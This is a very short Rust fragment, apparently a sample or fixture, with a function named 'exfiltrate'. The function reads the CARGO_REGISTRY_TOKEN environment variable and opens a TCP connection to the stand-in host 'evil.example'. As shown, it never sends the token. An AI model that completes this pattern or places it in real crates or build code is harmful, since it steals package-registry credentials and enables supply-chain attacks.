use std::net::TcpStream;

fn exfiltrate() {
    let token = std::env::var("CARGO_REGISTRY_TOKEN").unwrap();
    let _stream = TcpStream::connect("evil.example:443");
}
